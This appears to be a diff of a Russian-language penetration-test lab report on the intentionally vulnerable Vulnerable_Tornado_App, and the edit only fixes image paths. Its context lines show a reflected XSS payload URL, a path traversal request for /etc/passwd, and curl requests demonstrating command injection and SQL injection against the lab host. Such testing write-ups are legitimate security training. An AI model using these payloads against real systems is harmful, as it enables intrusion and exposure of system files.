@@ -43,8 +43,8 @@ https://github.com/ajinabraham/Vulnerable_Tornado_App
 - Отсутствует заголовок X-Frame-Options
 + Отсутствует заголовок X-Content-Type-Options
 + Найдена страница /login.html: Admin login page/section found.
-+ 
-![](src/images/Pasted%20image%2020250514084423.png)
+ 
+![](../../src/images/Pasted%20image%2020250514084423.png)
 #### Поиск директорий (FFUF)
 Найдено:
 	- index_html
@@ -52,8 +52,7 @@ https://github.com/ajinabraham/Vulnerable_Tornado_App
 	- search
 	- upload
 
-
-![](src/images/Pasted%20image%2020250514085341.png)
+![](../../src/images/Pasted%20image%2020250514085341.png)
 
 ## Автоматизированное тестирование
 #### ZAPPROXY
@@ -70,15 +69,15 @@ https://github.com/ajinabraham/Vulnerable_Tornado_App
 
 ##### Найденные уязвимости:
 
-![](src/images/Pasted%20image%2020250514095323.png)
+![](../../src/images/Pasted%20image%2020250514095323.png)
 
 - Отраженная XSS уязвимость: http://tornado_app:7788/search?q=%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E
 
-![](src/images/Pasted%20image%2020250514095103.png)
+![](../../src/images/Pasted%20image%2020250514095103.png)
 
 - Доступ к файлам и директориям: http://tornado_app:7788/read?file=../../../../../../../../../../../../../../../../etc/passwd
 
-![](src/images/Pasted%20image%2020250514095040.png)
+![](../../src/images/Pasted%20image%2020250514095040.png)
 - Удаленное выполнение команд 
 ```
 curl --location 'http://tornado_app:7788/server.html' \
@@ -86,7 +85,7 @@ curl --location 'http://tornado_app:7788/server.html' \
 --data-urlencode 'server=127.0.0.1&ls'
 ```
 
-![](src/images/Pasted%20image%2020250514095822.png)
+![](../../src/images/Pasted%20image%2020250514095822.png)
 
 - Возможность выполнения SQL-инъекций
 ```
@@ -96,7 +95,7 @@ curl --location 'http://tornado_app:7788/login.html' \
 --data-urlencode 'password=test'
 ```
 
-![](src/images/Pasted%20image%2020250514100433.png)
+![](../../src/images/Pasted%20image%2020250514100433.png)
 
 - Отсутствует заголовок X-Frame-Options
 + Отсутствует заголовок X-Content-Type-Options
